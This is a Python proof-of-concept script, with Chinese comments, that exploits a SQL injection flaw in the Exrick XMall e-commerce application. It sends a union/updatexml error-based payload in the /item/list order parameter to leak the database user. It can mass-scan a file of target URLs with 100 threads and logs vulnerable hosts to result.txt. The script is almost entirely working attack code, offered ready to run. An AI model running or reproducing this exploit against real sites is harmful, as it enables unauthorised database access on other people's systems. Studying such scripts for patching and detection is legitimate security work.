# Exrick XMall 开源商城 SQL注入漏洞
import argparse,sys,requests,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    # 定义横幅
    banner = """███████╗██╗  ██╗██████╗ ██╗ ██████╗██╗  ██╗        ██╗  ██╗███╗   ███╗ █████╗ ██╗     ██╗             ███████╗ ██████╗ ██╗     
██╔════╝╚██╗██╔╝██╔══██╗██║██╔════╝██║ ██╔╝        ╚██╗██╔╝████╗ ████║██╔══██╗██║     ██║             ██╔════╝██╔═══██╗██║     
█████╗   ╚███╔╝ ██████╔╝██║██║     █████╔╝          ╚███╔╝ ██╔████╔██║███████║██║     ██║             ███████╗██║   ██║██║     
██╔══╝   ██╔██╗ ██╔══██╗██║██║     ██╔═██╗          ██╔██╗ ██║╚██╔╝██║██╔══██║██║     ██║             ╚════██║██║▄▄ ██║██║     
███████╗██╔╝ ██╗██║  ██║██║╚██████╗██║  ██╗███████╗██╔╝ ██╗██║ ╚═╝ ██║██║  ██║███████╗███████╗███████╗███████║╚██████╔╝███████╗
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝ ╚══▀▀═╝ ╚══════╝                                                       
                                                                                       version:Exrick XMall 1.0.0                        
"""
    print(banner)
def main():  # 主函数
    banner()
    # 处理命令行输入的参数了吧
    # url file
    parser = argparse.ArgumentParser(description="Exrick XMall 开源商城 SQL注入漏洞")  # 实例化
    parser.add_argument('-u','--url',dest='url',type=str,help='intput link')  # 添加函数
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')  # 添加函数

    args = parser.parse_args()  # 调用
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag:\n\t python {sys.argv[0]} -h")


def poc(target):
    payload_url = '/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136'
    url = target+payload_url 
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res1 = requests.get(url=url,headers=header,verify=False)
        if res1.status_code == 200:
            match = re.findall( r'root', res1.text)
            if 'root' in match:
                print(f'[+] 该url存在sql注入漏洞为{target}')
                with open('result.txt','a',encoding='utf-8') as f:
                    f.write(target+'\n')
            else:
                print(f'[-]该url{target}不存在sql注入漏洞')
    except:
        print(f'[*]该url{target}可能存在访问问题，请手工测试')



if __name__ == '__main__':  # 函数入口
    main()